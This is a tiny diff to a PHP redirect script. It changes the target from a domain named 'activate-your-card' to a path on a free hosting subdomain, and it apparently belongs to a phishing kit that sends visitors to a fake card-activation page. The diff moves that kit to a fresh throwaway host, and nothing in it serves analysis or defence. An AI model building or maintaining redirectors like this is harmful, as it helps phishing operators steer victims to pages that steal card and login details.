@@ -1,4 +1,4 @@
 <?php
-header("Location: https://activate-your-card.ga/actnor/");
+header("Location: https://contortional-transm.000webhostapp.com/actnor/");
 die();
 ?>
